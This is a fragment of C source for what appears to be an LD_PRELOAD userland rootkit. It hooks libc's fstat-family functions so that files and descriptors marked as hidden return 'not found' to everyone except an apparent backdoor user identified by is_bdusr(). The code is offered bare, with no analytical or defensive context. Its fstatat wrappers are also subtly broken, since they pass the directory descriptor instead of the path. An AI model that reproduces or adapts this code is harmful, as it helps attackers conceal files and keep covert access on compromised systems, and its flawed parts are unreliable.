int fstat(int fd, struct stat *buf){
	hook(C__FXSTAT);
	if(is_bdusr())
		return (long)call(C__FXSTAT, _STAT_VER, fd, buf);
	if(hidden_fd(fd)){
		errno = ENOENT;
		return -1;
	}
	return (long)call(C__FXSTAT, _STAT_VER, fd, buf);
}

int fstat64(int fd, struct stat64 *buf){
	hook(C__FXSTAT64);
	if(is_bdusr())
		return (long)call(C__FXSTAT64, _STAT_VER, fd, buf);
	if(hidden_fd64(fd)){
		errno = ENOENT;
		return -1;
	}
	return (long)call(C__FXSTAT64, _STAT_VER, fd, buf);
}

int fstatat(int dirfd, const char *pathname, struct stat *buf, int flags){
	hook(C__FXSTAT);
	if(is_bdusr())
		return (long)call(C__FXSTAT, _STAT_VER, dirfd, buf);
	if(hidden_fd(dirfd) || hidden_path(pathname)){
		errno = ENOENT;
		return -1;
	}
	return (long)call(C__FXSTAT, _STAT_VER, dirfd, buf);
}

int fstatat64(int dirfd, const char *pathname, struct stat64 *buf, int flags){
	hook(C__FXSTAT64);
	if(is_bdusr())
		return (long)call(C__FXSTAT64, _STAT_VER, dirfd, buf);
	if(hidden_fd64(dirfd) || hidden_path64(pathname)){
		errno = ENOENT;
		return -1;
	}
	return (long)call(C__FXSTAT64, _STAT_VER, dirfd, buf);
}

int __fxstat(int version, int fd, struct stat *buf){
	hook(C__FXSTAT);
	if(is_bdusr())
		return (long)call(C__FXSTAT, version, fd, buf);
	if(hidden_fd(fd)){
		errno = ENOENT;
		return -1;
	}
	return (long)call(C__FXSTAT, version, fd, buf);
}

int __fxstat64(int version, int fd, struct stat64 *buf){
	hook(C__FXSTAT64);
	if(is_bdusr())
		return (long)call(C__FXSTAT64, version, fd, buf);
	if(hidden_fd64(fd)){
		errno = ENOENT;
		return -1;
	}
	return (long)call(C__FXSTAT64, version, fd, buf);
}
